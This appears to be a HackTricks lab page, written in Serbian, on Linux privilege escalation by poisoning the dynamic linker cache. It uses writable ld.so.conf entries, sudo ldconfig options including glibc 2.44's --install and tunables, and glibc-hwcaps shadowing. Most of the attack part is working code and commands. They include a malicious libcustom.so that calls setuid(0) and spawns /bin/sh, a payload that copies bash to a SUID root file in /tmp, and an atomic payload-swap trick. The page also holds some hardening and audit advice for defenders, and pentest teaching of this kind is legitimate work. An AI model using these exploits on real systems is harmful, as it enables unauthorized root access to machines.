# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

Ova stranica je fokusirana laboratorijska vežba za trovanje **keša sistemskog linkera putem `/etc/ld.so.conf` ili `ldconfig`**. Za injection biblioteke koja nedostaje, upisivi `RPATH`/`RUNPATH`, `LD_PRELOAD` i drugu generičku zloupotrebu SUID linkera pogledajte [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Priprema okruženja

U sledećem odeljku možete pronaći kod datoteka koje ćemo koristiti za pripremu okruženja

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Kreirajte** te fajlove na svojoj mašini u istoj fascikli
2. **Kompajlirajte** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopirajte** `libcustom.so` u `/usr/lib` i osvežite cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privilegije)
4. **Kompajlirajte** **izvršni fajl**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Proverite okruženje

Proverite da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da li možete da **izvršite** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Korisne komande za trijažu

Prilikom napada na stvarnu metu, proverite **tačan naziv biblioteke** koji binarni fajl zahteva, šta loader **trenutno razrešava** i koje konfigurisane putanje mogu da se menjaju bez izmene aktivnog cache-a.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Koristite `ldd` samo na **pouzdanom** executable-u. Neke implementacije ili neuobičajeni ELF interpreteri mogu dovesti do izvršavanja koda pod kontrolom napadača; `objdump -p ./file | grep NEEDED` bezbedno prikazuje direktne zavisnosti. Za pouzdani target, pozivanje otkrivenog interpretera sa `--list` prikazuje stvarnu rezoluciju. Uporedite taj izlaz sa `--inhibit-cache --list`: razlika dokazuje da je `/etc/ld.so.cache`, a ne uobičajeno pravilo putanje pretrage, odabralo objekat.<sup>[[1]](#references)[[4]](#references)</sup>

Nekoliko korisnih napomena:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` obično **ne radi** zato što redirekciju izvršava vaš trenutni shell. Umesto toga koristite
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged** binarni fajlovi rade u **secure-execution mode**: `LD_LIBRARY_PATH`
se ignoriše, dok je `LD_PRELOAD` ograničen (imena koja sadrže kosu crtu
se ignorišu, a mogu se preload-ovati samo biblioteke označene setuid bitom u standardnim direktorijumima). Kada root pokrene `ldconfig`, direktorijumi navedeni u
`/etc/ld.so.conf` mogu dospeti u `/etc/ld.so.cache`, pa ova pogrešna konfiguracija
i dalje može uticati na privileged programe.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` se takođe ignoriše u secure-execution mode-u, osim ako postoji `/etc/suid-debug`, zato njegov trace prikupljajte iz ekvivalentnog non-SUID pokretanja, umesto da očekujete izlaz iz privileged izvršavanja.<sup>[[1]](#references)</sup>
- Na glibc 2.33 i novijim verzijama, dynamic loader takođe podržava
`--list-diagnostics`, koji ispisuje mašinski čitljivu dijagnostiku loader-a i ugrađene informacije o putanjama pretrage kada hijack ne radi očekivano.<sup>[[1]](#references)[[6]](#references)</sup>

### Ograničenja cache-a i SONAME-a

`ldconfig` ne kešira svaki proizvoljni fajl u konfigurisanom direktorijumu: ispituje ELF zaglavlja, prepoznaje imena koja odgovaraju obrascu `lib*.so*` ili `ld-*.so*` i očekuje uobičajeni lanac `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Injected objekat zato mora imati ciljnu arhitekturu/klasu, tačno `DT_NEEDED` ime (obično njegov `DT_SONAME`), kao i sve simbole/verzije koje victim razrešava.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Dajte prednost biblioteci specifičnoj za cilj, kao u ovom primeru. Shadowing uobičajenog SONAME-a nepotpunim objektom može pokvariti svaki proces koji ga razreši pre nego što se pokrene predviđeni privilegovani cilj.<sup>[[3]](#references)</sup>

### Perzistencija keširane putanje i atomske zamene

Keš beleži mapiranje **naziva biblioteke na putanju**; on ne ugrađuje shared object. Nakon što se putanja pod kontrolom napadača kešira, zamena objekta na toj istoj putanji utiče na novopokrenute procese bez ponovnog pokretanja `ldconfig`. Ovo omogućava koristan obrazac provere pre upotrebe (time-of-check/time-of-use): izložite validnu biblioteku tokom ponovne izgradnje keša ili inspekcije koju obavlja administrator, a zatim atomski preimenujte payload preko nje. Postojeći procesi zadržavaju već mapirani objekat.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Isto tako, brisanje zlonamerne linije iz datoteke `ld.so.conf` samo po sebi ne uklanja već upisan unos: administrator mora da ukloni nepouzdani objekat, ispravi vlasništvo/pristup za upis i ponovo izgradi cache. Koristite poređenje sa `--inhibit-cache` iznad da biste razlikovali zastareli unos u cache-u od i dalje aktivne putanje konfiguracije.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

U ovom scenariju pretpostavimo da je administrator dodao ranjivi unos u
datoteku unutar `/etc/ld.so.conf.d/` koju uključuje sistemska
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ranjivi folder je _/home/ubuntu/lib_ (gde imamo dozvolu za upis).\
**Preuzmite i kompajlirajte** sledeći kod unutar te putanje:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ako očekujete da će **root** (ili drugi privilegovani nalog) kasnije izvršiti ranjivi **binary**, obično je bolje ostaviti **root-owned artifact** umesto pokretanja interaktivnog shell-a. Na primer:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Zatim, nakon što se izvršavanje s privilegijama obavi, možete koristiti `/tmp/rootbash -p`.

Sada kada smo **kreirali zlonamernu libcustom biblioteku unutar pogrešno konfigurisane** putanje, podrazumevani keš mora biti ponovo izgrađen uspešnim pokretanjem privilegovanog **`ldconfig`**. Ponovno pokretanje sistema pomaže samo tamo gde ga lokalni proces pokretanja zaista poziva; u suprotnom sačekajte intervenciju administratora ili upotrebite nesigurno sudo pravilo, ako je dostupno.<sup>[[2]](#references)</sup>

Kada se to dogodi, **ponovo proverite** odakle izvršna datoteka `sharedvuln` učitava biblioteku `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kao što možete videti, **učitava je iz `/home/ubuntu/lib`**, a ako je bilo koji korisnik izvrši, biće pokrenut shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Imajte na umu da u ovom primeru nismo eskalirali privilegije, ali ćemo izmenom izvršenih komandi i **čekanjem da root ili drugi privilegovani korisnik izvrši ranjivu binarnu datoteku** moći da eskaliramo privilegije.

### Modern `glibc-hwcaps` shadowing

Od glibc verzije 2.33, loader može da daje prednost optimizovanim bibliotekama unutar `glibc-hwcaps/<level>/` u **svakom direktorijumu za pretragu biblioteka**. Zato provera samo direktorijuma `/home/ubuntu/lib` nije dovoljna: upisiv kompatibilan poddirektorijum, kao što je `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, može da zaseni osnovnu biblioteku nakon što ga `ldconfig` indeksira, dok će drugi CPU-ovi nastaviti da koriste osnovni objekat. Ovo takođe omogućava hijacking specifičan za arhitekturu, koji može biti propušten kada se validacija obavlja na drugom CPU-u.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Trenutne glibc smernice za hardening preporučuju izbegavanje duplih SONAME vrednosti, lokacija za pretragu koje nisu podrazumevane i objekata u `glibc-hwcaps` poddirektorijumima. Iz perspektive audita, rekurzivno proverite vlasništvo i dozvole za pisanje nad konfigurisanim direktorijumima i svim komponentama njihove putanje.<sup>[[3]](#references)</sup>

### Druge pogrešne konfiguracije - Ista ranjivost

U prethodnom primeru smo simulirali pogrešnu konfiguraciju u kojoj je administrator **postavio folder bez privilegija unutar konfiguracionog fajla u `/etc/ld.so.conf.d/`**.\
Međutim, postoje i druge pogrešne konfiguracije koje mogu izazvati istu ranjivost: ako imate **dozvole za pisanje** u učitanom **config fajlu**, možete kreirati fajl u direktorijumu `/etc/ld.so.conf.d/` u koji je moguće pisati ili možete pisati u `/etc/ld.so.conf`, možete konfigurisati i iskoristiti istu ranjivost.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Pretpostavimo da imate sudo privilegije nad `ldconfig`**. `ldconfig` prihvata direktorijume za skeniranje kao pozicione argumente, pa je najkraći oblik trovanja keša često jednostavno:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Alternativno, `-f` bira drugu konfiguracionu datoteku, uz zadržavanje podrazumevanog izlaza keša. Ovo je korisno kada filter argumenata blokira pozicione direktorijume, ali i dalje dozvoljava `-f`, ili kada je potrebno ubaciti nekoliko putanja:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sada, kao što je navedeno u **prethodnom exploit-u**, **kreirajte malicious library unutar `/tmp`**.\
I na kraju, učitajmo putanju i proverimo odakle binary učitava library:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kao što možete videti, ako imate sudo privilegije nad `ldconfig`, možete iskoristiti istu ranjivost.** Detalji opcija su važni pri proceni ograničenog sudo pravila: `-f` bira drugu konfiguraciju, ali i dalje ponovo izgrađuje `/etc/ld.so.cache`; `-C` preusmerava keš na drugo mesto; `-N` sprečava ponovnu izgradnju keša; a `-X` sprečava ažuriranje linkova, ali **i dalje ponovo izgrađuje keš osim ako se ne kombinuje sa `-N`**. `-n` podrazumeva `-N`, pa može ažurirati linkove u prosleđenim direktorijumima, ali ne može zatrovati keš; `-r` radi ispod alternativnog root direktorijuma i obično ne menja keš hosta.<sup>[[2]](#references)</sup>

### glibc 2.44: instaliranje unapred izgrađenog keša

Glibc 2.44 je dodao `ldconfig --install SOURCE`, koji atomski kopira unapred izgrađeni keš na izabrano odredište keša (host `/etc/ld.so.cache`, osim ako ga `-C` ili `-r` ne promene). Ovo predstavlja još jedan opasan argument za sudoers pravila i privilegovane wrapper-e: napadač može **bez privilegija** da napravi validan keš, a zatim pomoću dozvoljenog poziva `--install` zameni sistemski keš. Putanja za instalaciju proverava magic vrednost keša, ali ne generiše ponovo njegove stavke na osnovu pouzdane konfiguracije.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Keš i dalje sadrži **putanje**, a ne bajtove biblioteka, tako da `/tmp/libcustom.so` mora ostati prisutan i kompatibilan kada se žrtva pokrene. Filteri koji samo odbijaju `-f`, pozicione direktorijume ili `-t` stoga nisu potpuni na glibc 2.44: odbijte i `--install`/`-I` ili, još bolje, uopšte nemojte delegirati `ldconfig`.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: keširani sistemski tunables

Počev od glibc 2.44, `ldconfig` takođe parsira `/etc/tunables.conf` i čuva njegova podešavanja kao ekstenziju u `/etc/ld.so.cache`. Fajl prihvata `include` direktive i filtere po procesu. Prefiksi kontrolišu opseg: `@`/`onlysecure` cilja samo `AT_SECURE` procese, `$`/`nonsecure` ih isključuje, a `*`/`anysecure` obuhvata oba tipa. **Unos bez prefiksa podrazumevano se odnosi na nebezbedne procese**, pa napadač mora eksplicitno da upotrebi `@` ili `*` kako bi uticao na setuid, setgid ili programe sa povišenim capability privilegijama. Ovo proširuje granice revizije izvan direktorijuma biblioteka: upisiva konfiguracija tunables ili uključeni fajl mogu uticati na buduća pokretanja programa nakon privilegovane ponovne izgradnje keša.<sup>[[7]](#references)[[9]](#references)</sup>

Isto izdanje dodaje `ldconfig -t TUNCONF`, koji bira alternativni fajl tunables, a pritom i dalje upisuje uobičajeni keš, osim ako neka druga opcija to ne promeni. Zato wrapperi i sudo pravila koja su pokušavala da blokiraju samo `-f` moraju takođe odbijati `-t`, proizvoljne pozicione direktorijume, `--install` i manipulisanje izlazom keša.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### Tunables specifični za cilj

Filter `[proc:PATTERN]` primenjuje sledeće unose samo kada se puna putanja izvršne datoteke `/proc/self/exe` (ako `PATTERN` počinje znakom `/`) ili basename podudara. Filter se završava na sledećem filteru, `[]`, kraju datoteke ili granici include-file datoteke. Ovo čini poisoned cache manje uočljivim, jer se izmenjeno ponašanje može ograničiti na jednu privilegovanu žrtvu.<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
Prefiks `-`/`nonoverridable` sprečava da `GLIBC_TUNABLES` zameni keširanu vrednost; `+`/`overridable` vraća uobičajeno ponašanje zamene. Za procese sa `AT_SECURE` promenljiva okruženja se u svakom slučaju potpuno ignoriše. Format datoteke tretirajte kao specifičan za verziju — glibc ne garantuje da će biti stabilan interfejs — i navedite podržana imena i vrednosti pomoću `"$interp" --list-tunables` pre pokušaja ciljano usmerenog efekta.<sup>[[7]](#references)[[9]](#references)</sup>

Ovo nije automatski proizvoljno izvršavanje koda. To je privilegovana primitiva za **manipulaciju ponašanjem loadera**: glibc izričito upozorava da vrednosti na nivou sistema mogu primeniti bezbednosno osetljiva podešavanja na setuid/setgid programe bez bezbednosne provere po pojedinačnom podešavanju. Tražite promene alokatora specifične za cilj, promene hardeninga CPU-a ili uslove za denial-of-service, umesto da pretpostavite univerzalni payload.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening dinamičkog linkera - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux stranica priručnika](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU binarni alati)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dijagnostika dinamičkog linkera (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Podešavanja na nivou sistema (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Dodavanje podešavanja na nivou sistema: deo ldconfig (zakrpa v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [The GNU C Library verzija 2.44 je sada dostupna](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [Izvorni kod glibc 2.44 ldconfig](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
